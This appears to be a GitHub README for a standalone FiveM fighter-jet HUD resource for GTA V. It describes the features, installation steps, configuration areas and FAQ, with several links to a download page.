# FighterJet HUD v2 - Game Script Utility 2026

> A self-contained FiveM aircraft HUD for GTA V fighter jets, built to swap out the stock cockpit display with flight instruments, weapon state, and warning cues.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-FiveM-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/ryanlabs86/fighterjet-hud-script-2026?style=flat-square)](https://github.com/ryanlabs86/fighterjet-hud-script-2026)

---

<p align="center">
  <a href="https://ryanlabs86.github.io/fighterjet-hud-script-2026/">
    <img src="https://img.shields.io/badge/Download-FighterJet%20HUD%20Script-brightgreen?style=for-the-badge" alt="Download FighterJet HUD Script">
  </a>
</p>

> **[Direct Download - FighterJet HUD](https://ryanlabs86.github.io/fighterjet-hud-script-2026/)**

---

[Download Latest Build](https://ryanlabs86.github.io/fighterjet-hud-script-2026/)

---

## What This Is

FighterJet HUD is a FiveM resource for GTA V aircraft that presents a fighter-jet inspired cockpit interface. Instead of the default vanilla HUD, it renders a custom layout that highlights flight telemetry, weapon indicators, and threat alerts in a more aviation-focused style.

It is designed to run on its own, without any framework dependency, so it can be added to a FiveM server and tuned per aircraft. Theme controls and vehicle-specific adjustments are included to make it easier to match different jet models and loadouts.

## Features

- Swaps the standard GTA V cockpit HUD for a fighter-jet style interface
- Shows speed, altitude, heading, pitch, roll, and FPM readings
- Provides weapon reticles and a named weapon annunciator
- Monitors lock and targeting states with audio feedback
- Includes an RWR with directional threat detection
- Plays synthesized cockpit audio in real time through the browser layer
- Supports per-vehicle setup for aircraft models and theme colors
- Operates as a standalone FiveM resource with no framework dependencies

## Installation

1. Download the latest build from the project page.
2. Put the resource folder into your FiveM resources directory.
3. Rename the folder if desired, or leave it as-is, for example:
   fighterjet-hud-western
4. Register the resource in your server configuration:
   ensure fighterjet-hud-western
5. Restart the server, or refresh resources, so the HUD loads.

If your server uses custom aircraft or weapon mappings, adjust the resource settings so the HUD matches the vehicle model and weapon behavior you want to display.

## Configuration

Common tuning points include vehicle matching, theme colors, and warning behavior. The exact option names can differ by release, but the script is meant to support aircraft-specific adjustments.

| Setting Area | Purpose | Common Use |
| --- | --- | --- |
| Vehicle model mapping | Assign HUD behavior to specific jets | Match display logic to a given aircraft |
| Theme color | Change the visual accent color | Adapt the HUD to a server style |
| Weapon annunciator | Control weapon label display | Show the active weapon name |
| RWR behavior | Tune threat detection output | Adjust warning presentation |
| Audio cues | Enable cockpit sound feedback | Reflect lock or targeting states |
| NUI display | Manage the interface layer | Control how the HUD is rendered |

## Compatibility Notes

FighterJet HUD is made for FiveM and GTA V aircraft scenarios. It targets fighter-jet gameplay and depends on the server's supported vehicle and weapon setup.

Known considerations:

- Intended for GTA V aircraft, not ground vehicles
- Visual output varies with the aircraft model and configured weapon systems
- Some HUD elements may need matching vehicle definitions to behave as expected
- As a standalone resource, it does not depend on framework-specific integrations

## FAQ

### How do I install it?
Download the archive, copy the resource folder into your FiveM resources directory, and add an `ensure` line to your server configuration.

### Can I customize the look?
Yes. The resource includes theme color support and per-vehicle tuning, allowing the HUD to be adapted for different aircraft or server styles.

### Does it work without a framework?
Yes. It is meant to run as a standalone FiveM resource with no framework dependencies.

### What game is it for?
It is intended for GTA V aircraft use inside FiveM.

### Can I use it with different jets?
Yes. The resource is built around per-vehicle model configuration, so different fighter aircraft can be mapped separately.

### Where are the sounds handled?
Cockpit sound playback is handled in the browser-based UI layer using synthesized audio behavior.

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
